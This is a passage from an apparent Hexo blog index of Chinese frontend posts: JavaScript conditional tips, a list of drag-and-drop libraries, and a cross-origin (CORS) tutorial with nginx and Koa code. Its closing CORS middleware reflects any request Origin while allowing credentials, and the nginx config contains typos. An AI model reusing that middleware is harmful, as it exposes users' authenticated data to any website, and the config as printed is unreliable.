class="line"><span class="title function_">check</span>(<span class="string">&#x27;茉莉&#x27;</span>, <span class="number">2</span>); <span class="comment">// 2朵茉莉</span></span><br></pre></td></tr></table></figure><p><br />可以使用函数默认参数来简化上面的代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">flower, quantity = <span class="number">1</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!flower) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;quantity&#125;</span>朵<span class="subst">$&#123;flower&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>(<span class="string">&#x27;玫瑰&#x27;</span>);    <span class="comment">// 1朵玫瑰</span></span><br><span class="line"><span class="title function_">check</span>(<span class="string">&#x27;茉莉&#x27;</span>, <span class="number">2</span>); <span class="comment">// 2朵茉莉</span></span><br></pre></td></tr></table></figure><p><br />那如果<code>flower</code>参数是一个对象怎么办呢？来看下面的代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">flower</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flower &amp;&amp; flower.<span class="property">name</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(flower.<span class="property">name</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;unknown&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>(<span class="literal">undefined</span>);  <span class="comment">// unknown</span></span><br><span class="line"><span class="title function_">check</span>(&#123;&#125;);  <span class="comment">// unknown</span></span><br></pre></td></tr></table></figure><p><br />可以从对象中解构需要的属性：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">&#123;name&#125; = &#123;&#125;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="property">log</span> (name || <span class="string">&#x27;unknown&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="title function_">check</span>(<span class="literal">undefined</span>);  <span class="comment">// unknown</span></span><br><span class="line"><span class="title function_">check</span>(&#123;&#125;);  <span class="comment">// unknown</span></span><br><span class="line"><span class="title function_">check</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;玫瑰&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span> &#125;);  <span class="comment">// 玫瑰</span></span><br></pre></td></tr></table></figure><p><br />在函数中需要<code>flower</code>对象中的<code>name</code>属性，可以使用<code>&#123;name&#125;</code>来解构该参数。除此之外，还是用<code>&#123;&#125;</code>来作为参数的默认值，这样在<code>check(undefined)</code>时，也就是参数不是对象时，参数默认为一个空对象，否则就会报错，因为<code>undefined</code>中没有<code>name</code>属性。</p><p><a name="wmCKq"></a></p><h2 id="8-逻辑与运算符"><a href="#8-逻辑与运算符" class="headerlink" title="8. 逻辑与运算符"></a>8. 逻辑与运算符</h2><p>来看下面的代码：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a &lt; <span class="number">0</span> &amp;&amp; b &gt; <span class="number">100</span> &amp;&amp; c === <span class="number">10</span>) &#123;</span><br><span class="line">  <span class="title function_">fn</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />对于逻辑与运算符，其左侧的条件如果为<code>false</code>，就会直接发生短路，不再继续往后执行；如果左侧的条件为<code>true</code>，就会返回其右侧的计算结果。所以，对于这种 <code>if</code>中只有一行表达式的情况，可以使用逻辑与运算符来简化，其中左侧为判断条件，右侧是要执行的逻辑：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(a &lt; <span class="number">0</span> &amp;&amp; b &gt; <span class="number">100</span> &amp;&amp; c === <span class="number">10</span>) &amp;&amp; <span class="title function_">fn</span>();</span><br></pre></td></tr></table></figure><p><br /><strong>参考：</strong><br />1<a href="https://www.digitalocean.com/community/posts/5-tips-to-write-better-conditionals-in-javascript">https://www.digitalocean.com/community/posts/5-tips-to-write-better-conditionals-in-javascript</a><br />2<a href="https://www.geeksforgeeks.org/tips-for-writing-better-conditionals-in-javascript/">https://www.geeksforgeeks.org/tips-for-writing-better-conditionals-in-javascript/</a></p><br /> ]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拖拽排序库</title>
      <link href="/2022/08/16/frontend/collection/wheel/tuo-zhuai-pai-xu-ku/"/>
      <url>/2022/08/16/frontend/collection/wheel/tuo-zhuai-pai-xu-ku/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="PhFl1"></a></p><h1 id="1-React-Beautiful-Dnd"><a href="#1-React-Beautiful-Dnd" class="headerlink" title="1. React Beautiful Dnd"></a>1. React Beautiful Dnd</h1><p>react-beautiful-dnd 是一款美观且简单易用的 React 列表拖拽库。其动画效果自然，性能优秀，简洁而强大的 API，易于上手，与标准浏览器的互动性非常好。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1658845658074-c11cf3bf-38e6-40be-a4b4-445c8898d079.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1658845658074-c11cf3bf-38e6-40be-a4b4-445c8898d079.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="NpcJr"></a></p><h1 id="2-Sortable"><a href="#2-Sortable" class="headerlink" title="2. Sortable"></a>2. Sortable</h1><p>Sortable 是一个 JavaScript 拖拽库，用于在现代浏览器和触摸设备上对拖放列表进行重新排序。支持 Meteor、AngularJS、React、Polymer、Vue、Ember、Knockout 和任何 CSS 库。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658845354776-d9e504e8-1a16-4a69-b5aa-1d7b458a12be.png?x-oss-process=image/resize,w_778,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658845354776-d9e504e8-1a16-4a69-b5aa-1d7b458a12be.png?x-oss-process=image/resize,w_778,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="SdSue"></a></p><h1 id="3-Dragula"><a href="#3-Dragula" class="headerlink" title="3. Dragula"></a>3. Dragula</h1><p>Dragula 是一个 JavaScript 库，实现了网页上的拖放功能。提供 JavaScript、AngularJS 和 React 版本。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658846116809-5f5ed7f0-2b78-4108-a99c-7f22dc5a6123.png?x-oss-process=image/resize,w_786,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658846116809-5f5ed7f0-2b78-4108-a99c-7f22dc5a6123.png?x-oss-process=image/resize,w_786,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="KMplr"></a></p><h1 id="4-React-DnD"><a href="#4-React-DnD" class="headerlink" title="4. React DnD"></a>4. React DnD</h1><p>React DnD是 React 和 Redux 核心作者 Dan Abramov 创造的一组React 高阶组件，可帮助我们构建复杂的拖放界面，同时保持组件解耦。它可以在应用程序的不同部分之间通过拖动传输数据，并且组件会更改其外观和应用状态以响应拖放事件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658844194608-80d5a46d-2ef5-4f67-9db6-73638e8165a8.png?x-oss-process=image/resize,w_949,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658844194608-80d5a46d-2ef5-4f67-9db6-73638e8165a8.png?x-oss-process=image/resize,w_949,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="cSH6e"></a></p><h1 id="5-Vue-Draggable"><a href="#5-Vue-Draggable" class="headerlink" title="5. Vue.Draggable"></a>5. Vue.Draggable</h1><p>Vue.Draggable 是基于 Sortable.js 的 Vue 拖放组件。它允许拖放和视图模型数组同步，基于并提供 Sortable.js 的所有功能。该库适用于Vue 2，如果想在 Vue 3 中使用该库，可以访问：<a href="https://github.com/SortableJS/vue.draggable.next">https://github.com/SortableJS/vue.draggable.next</a>。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1658845095630-ba6a45c9-fe9b-45cd-8ccf-ea7618a3f069.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1658845095630-ba6a45c9-fe9b-45cd-8ccf-ea7618a3f069.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="wCevg"></a></p><h1 id="6-interact-js"><a href="#6-interact-js" class="headerlink" title="6. interact.js"></a>6. interact.js</h1><p>interact.js 是一个适用于现代浏览器的 JavaScript 拖放库，支持调整大小和多点触控手势，具有惯性和捕捉功能。为了尽可能多地提供控制，它尝试提供一个简单、灵活的API，该 API 提供移动元素所需的所有拖拽API。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658845930134-ecc4b6d9-9195-497c-8a66-a503c4aa8d9f.png?x-oss-process=image/resize,w_933,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1658845930134-ecc4b6d9-9195-497c-8a66-a503c4aa8d9f.png?x-oss-process=image/resize,w_933,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="TwrSp"></a></p><h1 id="7-React-Draggable"><a href="#7-React-Draggable" class="headerlink" title="7. React Draggable"></a>7. React Draggable</h1><p>React-Draggable 库简单易用，将 CSS 中的transform应用于 React 组件，允许我们在 UI 中拖动组件。它有不同的 props 可以让你改变组件的行为，是创建直观、用户友好界面的绝佳选择。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1658844929818-c8bf8b77-056d-4830-bb8c-36fcc966a31f.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1658844929818-c8bf8b77-056d-4830-bb8c-36fcc966a31f.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="GSj3v"></a></p><h1 id="8-React-Sortable-Tree"><a href="#8-React-Sortable-Tree" class="headerlink" title="8. React Sortable Tree"></a>8. React Sortable Tree</h1><p>React Sortable Tree 是一个用于对分层数据进行拖放式可排序表示的React组件。它支持单选多选，鼠标拖拽子集到新合集，模糊搜索等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1658846422180-4a092775-e056-4f74-a4cc-4807f0696dc7.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1658846422180-4a092775-e056-4f74-a4cc-4807f0696dc7.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><br /> ]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 拖拽排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域的产生于解决</title>
      <link href="/2022/08/05/solution/kua-yu-de-chan-sheng-yu-jie-jue/"/>
      <url>/2022/08/05/solution/kua-yu-de-chan-sheng-yu-jie-jue/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="FoJXO"></a></p><h2 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h2><p><strong>跨域</strong>，是指浏览器不能执行其他网站的脚本。它是由浏览器的同源策略造成的，是浏览器对JavaScript实施的安全限制。<br /><strong>同源策略</strong>：是一个重要的安全策略，它用于限制一个origin的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。所谓的同源，指的是协议、域名、端口相同。浏览器处于安全方面的考虑，只允许本域名下的接口交互，不同源的客户端脚本，在没有明确授权的情况下，不能读写对方的资源。</p><p><a name="ThR4U"></a></p><h3 id="同源策略限制的内容"><a href="#同源策略限制的内容" class="headerlink" title="同源策略限制的内容"></a>同源策略限制的内容</h3><ul><li>Cookie , LocalStorage ,IndexedDB等存储性内容。</li><li>DOM节点</li><li>AJAX请求发送后,非同源会被浏览器拦截。<br />但是有三个标签是允许跨域加载资源:</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">XXX</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">XXX</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">XXX</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="Isv8E"></a></p><h3 id="跨域产生的原因"><a href="#跨域产生的原因" class="headerlink" title="跨域产生的原因"></a>跨域产生的原因</h3><p>浏览器遵从同源策略，限制 <code>ajax</code> 跨域的原因在于 <code>ajax</code> 网络请求是可以携带 <code>cookie</code> 的（通过设置 <code>withCredentials</code> 为 <code>true</code> ），比如用户打开了浏览器，登录了 <code>weibo.com</code> ，然后又打开了<code>baidu.com</code>，这时候百度首页内的 <code>js</code> ，向 <code>weibo.com</code> 用 <code>withCredentials</code> 为 <code>true</code> 的 <code>ajax</code> 方式提交一个 <code>post</code> 请求，是会携带浏览器和 <code>weibo.com</code> 之间的 <code>cookie</code> 的，所以浏览器就默认禁止了 <code>ajax</code> 跨域。<br />只有当 <strong>protocol（协议）、domain（域名）、port（端口）三者一致，</strong>才是同源。</p><p><a name="9QSxe"></a></p><h3 id="反向代理和正向代理"><a href="#反向代理和正向代理" class="headerlink" title="反向代理和正向代理"></a>反向代理和正向代理</h3><p><a name="ubDH4"></a></p><h4 id="反向代理-隐藏真实的服务器端"><a href="#反向代理-隐藏真实的服务器端" class="headerlink" title="反向代理:隐藏真实的服务器端"></a>反向代理:隐藏真实的服务器端</h4><p>类似场景：拨打总机号，然后一层层转接到分机<br />真实场景：访问淘宝—》反向代理服务器—》转发到真实的服务器—》返回资源给反向代理服务器—》返回给客户端<br><a name="iSzu3"></a></p><h4 id="正向代理：隐藏真实的客户端"><a href="#正向代理：隐藏真实的客户端" class="headerlink" title="正向代理：隐藏真实的客户端"></a>正向代理：隐藏真实的客户端</h4><p>类似场景：A问B借钱，B不肯，A拜托B的挚友C帮忙，C问B借到了钱，然后把钱给了A，而B并不知道实际是A借的钱<br />真实场景：客户端请求访问 facebook.com,无法访问到资源，这时借助代理，代理请求facebook的资源，然后发送给客户端，facebook.com并不知道真正的客户端是谁</p><p><a name="eJ8uM"></a></p><h2 id="跨域的解决方案"><a href="#跨域的解决方案" class="headerlink" title="跨域的解决方案"></a>跨域的解决方案</h2><p><a name="PQI7q"></a></p><h3 id="Nginx-反向代理"><a href="#Nginx-反向代理" class="headerlink" title="Nginx 反向代理"></a>Nginx 反向代理</h3><p><a name="7Qz7u"></a></p><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Nginx 通过反向代理的方式保证当前域，能获取到静态资源和接口，不关心是怎么获取的。<br /><a href="https://www.yuque.com/snb/efe/yignkl?view=doc_embed">Nginx 从入门到实践</a><br /><a href="https://www.yuque.com/snb/efe/oz2qqg?view=doc_embed">nginx反向代理和负载均衡策略实战案例</a><br /><img src="https://cdn.nlark.com/yuque/0/2020/svg/164572/1591152392946-59e6393b-18d8-410d-8402-3e3d64406a8b.svg" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/svg/164572/1591152392946-59e6393b-18d8-410d-8402-3e3d64406a8b.svg" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="RwELo"></a></p><h4 id="配置-Nginx"><a href="#配置-Nginx" class="headerlink" title="配置 Nginx"></a>配置 Nginx</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">  <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">  <span class="attribute">server_name</span>  www.xxx.com;</span><br><span class="line">  <span class="attribute">index</span> index.html index.htm default.html default.htm;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#ERROR-PAGE-START  错误页配置，可以注释、删除或修改</span></span><br><span class="line"> <span class="comment">#error_page 404 /www/wwwroot/index.html;</span></span><br><span class="line">  </span><br><span class="line">  <span class="section">location</span> / &#123;</span><br><span class="line">    <span class="comment">#proxy_pass http://abc.xx.com;</span></span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">root</span> /www/wwwroot/proxy.test;</span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$url</span>/ /index.html = <span class="number">404</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="section">location</span><span class="regexp"> ^~</span> /api/ &#123;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Connection <span class="variable">$connection_upgrade</span>;</span><br><span class="line">    <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#持久化连接相关配置</span></span><br><span class="line">    <span class="comment">#proxy_connect_timeout 30s;</span></span><br><span class="line">    <span class="comment">#proxy_read_timeout 86400s;</span></span><br><span class="line">    <span class="comment">#proxy_send_timeout 30s;</span></span><br><span class="line">    <span class="comment">#proxy_http_version 1.1;</span></span><br><span class="line">    <span class="comment">#proxy_set_header Upgrade $http_upgrade;</span></span><br><span class="line">    <span class="comment">#proxy_set_header Connection $connection_upgrade;</span></span><br><span class="line">    </span><br><span class="line">    <span class="attribute">proxy_pass</span> http://app-api;</span><br><span class="line">    <span class="attribute">proxy_intercepe_errors</span> <span class="literal">on</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="ZSWIQ"></a></p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>前端代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">  getlist.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    axios.<span class="title function_">get</span>(<span class="string">&quot;/api/list&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">  login.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    axios.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>后端代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/api/list&quot;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    <span class="attr">data</span>: [&#123; <span class="attr">name</span>: <span class="string">&quot;test&quot;</span> &#125;]</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>, <span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.<span class="property">cookies</span>.<span class="title function_">set</span>(<span class="string">&quot;token&quot;</span>, token, &#123;</span><br><span class="line">    <span class="attr">expires</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(+<span class="keyword">new</span> <span class="title class_">Date</span>() + <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>)</span><br><span class="line">  &#125;);</span><br><span class="line">  ctx.<span class="property">body</span> = &#123;</span><br><span class="line">    <span class="attr">msg</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">    <span class="attr">code</span>: <span class="number">0</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="uBkSN"></a></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><a name="ONXWn"></a></p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>CORS（cross-origin resource sharing），跨源资源共享（一般俗称『跨域请求』），跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器 让运行在一个 origin (domain) 上的 Web 应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器<strong>「不同的域、协议或端口」</strong>请求一个资源时，资源会发起一个<strong>「跨域 HTTP 请求</strong>。 <br />MDN 上的介绍 (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)%E3%80%82">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)。</a><br />而在 cors 中会有 <strong>简单请求</strong> 和 <strong>预检请求（preflighted requests）</strong>的概念。<br /><strong>浏览器支持情况：</strong>当你使用 IE&lt;&#x3D;9, Opera&lt;12, or Firefox&lt;3.5 或者更加老的浏览器，这个时候请使用 JSONP 。</p><p><a name="WQy3Q"></a></p><h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><p>不会触发 CORS <strong>预检请求</strong>。这样的请求为“<strong>简单请求</strong>”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。<br />若请求满足所有下述条件，则该请求可视为“<strong>简单请求</strong>”：</p><ul><li><strong>HTTP 方法</strong>只能是 GET、HEAD 或 POST；</li><li><strong>HTTP 头</strong>只能是 Accept&#x2F;Accept-Language&#x2F;Conent-Language&#x2F;Content-Type&#x2F;DPR&#x2F;Downlink&#x2F;Save-Data&#x2F;Viewport-Width&#x2F;Width；</li><li><strong>Content-Type 头</strong>只能是 text&#x2F;plain、multipart&#x2F;form-data 或 application&#x2F;x-www-form-urlencoded。</li><li>请求中的任意 <code>XMLHttpRequestUpload</code> 对象均没有注册任何事件监听器；<code>XMLHttpRequestUpload</code> 对象可以使用 <code>XMLHttpRequest.upload</code> 属性访问。</li><li>请求中没有使用 <code>ReadableStream</code> 对象。</li></ul><p><a name="Zbdfr"></a></p><h4 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h4><p>除以上情况外的。</p><p>看上去很是复杂。那么怎么理解这些限制呢？<br />其实，<strong>简单请求就是普通 HTML Form 在不依赖脚本的情况下可以发出的请求</strong>，比如表单的 method 如果指定为 POST ，可以用 enctype 属性指定用什么方式对表单内容进行编码，合法的值就是前述这三种。<br /><strong>非简单请求就是普通 HTML Form 无法实现的请求。</strong>比如 PUT 方法、需要其他的内容编码方式、自定义头之类的。</p><p>对于服务器来说，第一，许多服务器压根没打算给跨源用。当然你不给 CORS 响应头，浏览器也不会使用响应结果，但是请求本身可能已经造成了后果。所以最好是默认禁止跨源请求。<br />第二，要回答某个请求是否接受跨源，可能涉及额外的计算逻辑。这个逻辑可能很简单，比如一律放行。也可能比较复杂，结果可能取决于哪个资源哪种操作来自哪个 origin。对浏览器来说，就是某个资源是否允许跨源这么简单；对服务器来说，计算成本却可大可小。所以我们希望最好不用每次请求都让服务器劳神计算。<br />CORS-preflight 就是这样一种机制，浏览器先单独请求一次，询问服务器某个资源是否可以跨源，如果不允许的话就不发实际的请求。注意先许可再请求等于默认禁止了跨源请求。如果允许的话，浏览器会记住，然后发实际请求，且之后每次就都直接请求而不用再询问服务器否可以跨源了。于是，服务器想支持跨源，就只要针对 preflight 进行跨源许可计算。本身真正的响应代码则完全不管这个事情。并且因为 preflight 是许可式的，也就是说如果服务器不打算接受跨源，什么事情都不用做。<br />但是这机制只能限于非简单请求。在处理简单请求的时候，如果服务器不打算接受跨源请求，不能依赖 CORS-preflight 机制。因为不通过 CORS，普通表单也能发起简单请求，所以默认禁止跨源是做不到的。<br />既然如此，简单请求发 preflight 就没有意义了，就算发了服务器也省不了后续每次的计算，反而在一开始多了一次 preflight。<br />有些人把简单请求不需要 preflight 理解为『向下兼容』。这也不能说错。但严格来说，并不是『为了向下兼容』而不能发。理论上浏览器可以区别对待表单请求和非表单请求 —— 对传统的跨源表单提交不发 preflight，从而保持兼容，只对非表单跨源请求发 preflight。<br />但这样做并没有什么好处，反而把事情搞复杂了。比如本来你可以直接用脚本发跨源普通请求，尽管（在服务器默认没有跨源处理的情况下）你无法得到响应结果，但是你的需求可能只是发送无需返回，比如打个日志。但现在如果服务器不理解 preflight 你就干不了这个事情了。<br />而且如果真的这样做，服务器就变成了默认允许跨源表单，如果想控制跨源，还是得（跟原本一样）直接在响应处理中执行跨源计算逻辑；另一方面服务器又需要增加对 preflight 请求的响应支持，执行类似的跨源计算逻辑以控制来自非表单的相同跨源请求。服务器通常没有区分表单&#x2F;非表单差异的需求，这样搞纯粹是折腾服务器端工程师。<br />所以简单请求不发 preflight 不是因为不能兼容，而是因为兼容的前提下发 preflight 对绝大多数服务器应用来说没有意义，反而把问题搞复杂了。</p><p><a name="UdvCE"></a></p><h4 id="Node-中的解决方案"><a href="#Node-中的解决方案" class="headerlink" title="Node 中的解决方案"></a>Node 中的解决方案</h4><p><a name="hIxcn"></a></p><h5 id="原生方式"><a href="#原生方式" class="headerlink" title="原生方式"></a>原生方式</h5><p>我们来看下后端部分的解决方案。<code>Node</code> 中 <code>CORS</code> 的解决代码.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  ctx.<span class="title function_">set</span>(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, ctx.<span class="property">headers</span>.<span class="property">origin</span>);</span><br><span class="line">  ctx.<span class="title function_">set</span>(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">  ctx.<span class="title function_">set</span>(<span 